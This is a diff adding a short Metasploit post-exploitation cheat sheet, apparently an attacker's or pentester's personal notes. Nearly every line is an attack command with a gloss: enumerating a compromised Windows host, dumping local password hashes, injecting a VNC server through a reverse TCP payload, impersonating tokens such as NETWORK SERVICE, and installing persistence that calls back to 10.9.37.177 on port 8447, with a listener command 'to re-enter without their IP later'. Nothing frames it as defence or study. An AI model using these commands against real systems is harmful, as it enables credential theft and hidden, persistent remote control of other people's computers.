@@ -1,0 +1,26 @@
+run checkvm
+See if host is a VM, so you maybe can look for exploits to elevate you to the physical host
+
+run get_local_subnets
+Show local subnets, see if computer is apart of more than one network etc.
+
+run get_application_list
+Shows all installed apps and their versions
+
+run hashdump
+Collects local password hashes
+
+set payload windows/vncinject/reverse_tcp
+instead of meterpreter payload, inject a VNC server
+
+use incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\\NETWORK SERVICE"
+impersonate other users
+
+drop_token
+leave the impersonation
+
+run persistence -U -i 5 -p 8447 -r 10.9.37.177
+sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.9.37.177 LPORT=8447 E
+To re-enter without their IP later. Give different computers different Ports
